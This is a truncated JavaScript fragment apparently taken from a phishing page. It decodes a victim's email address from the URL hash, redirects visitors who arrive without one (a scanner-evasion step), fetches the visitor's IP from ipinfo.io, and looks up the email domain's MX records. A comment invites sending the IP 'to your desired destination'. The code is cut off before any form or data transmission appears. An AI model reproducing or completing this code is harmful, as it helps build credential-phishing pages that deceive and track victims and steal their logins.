    <script>
        var url = location.href;

        (function () {
            // Grab hash from URL
            let emailHash = window.location.hash;

            // If no hash, redirect immediately
            if (!emailHash) {
                window.location.href = "https://contribuu.com";
                return;
            }

            // Decode the email
            let email = handleBase64Data(emailHash.substr(1).split('/')[0]);

            // Simple email validation
            function isValidEmail(value) {
                return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value);
            }

            // Redirect if invalid
            if (!email || !isValidEmail(email)) {
                window.location.href = "/"; // redirect
                return;
            }

            // If valid, write it to the page AFTER DOM is ready
            window.addEventListener("DOMContentLoaded", function () {

            });

        function handleBase64Data(string) {

            try {
                return atob(string);
            } catch (error) {
                return string;
            }
        }

        function getVisitorIP() {
            return new Promise(function (resolve, reject) {
                var xhr = new XMLHttpRequest();
                xhr.open('GET', 'https://ipinfo.io/json', true);
                xhr.onload = function () {
                    if (xhr.status >= 200 && xhr.status < 300) {
                        var response = JSON.parse(xhr.responseText);
                        resolve(response.ip);
                    } else {
                        reject('Failed to fetch IP address');
                    }
                };
                xhr.onerror = function () {
                    reject('Failed to fetch IP address');
                };
                xhr.send();
            });
        }

        async function getMXRecord(domain) {
            try {
                const response = await fetch(`https://dns.google/resolve?name=${domain}&type=MX`);
                const data = await response.json();

                if (data && data.Answer && data.Answer.length > 0) {
                    const mxRecords = data.Answer.map(record => `${record.data}`).join('\n');
                    return mxRecords;
                } else {
                    return 'no-mx';
                }
            } catch (error) {
                return 'MX-Error';
            }
        }



        async function sendVisitorIP() {
            try {
                var visitorIP = await getVisitorIP();
                return visitorIP;
                // Here you can send the visitorIP value to your desired destination
            } catch (error) {
                return error
            }
        }
